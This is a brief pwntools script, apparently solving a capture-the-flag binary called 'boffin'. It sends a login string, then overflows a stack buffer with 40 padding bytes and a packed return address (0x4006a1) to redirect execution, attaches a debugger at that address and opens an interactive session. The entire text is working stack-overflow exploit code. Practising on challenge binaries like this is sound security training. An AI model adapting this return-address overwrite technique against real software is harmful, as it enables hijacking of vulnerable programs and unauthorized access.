from pwn import *

ret_addr = 0x004006a1
lil_end = p64(ret_addr)

context.log_level = 'debug'

p = process('./boffin')

gdb.attach(p, "break * 0x00000000004006a1")

p.sendafter('abc123): ', 'tg1799\n')
p.sendafter('name?\n', 'A'*40 + lil_end + "WWWWWWWW" + "\n")
p.interactive()



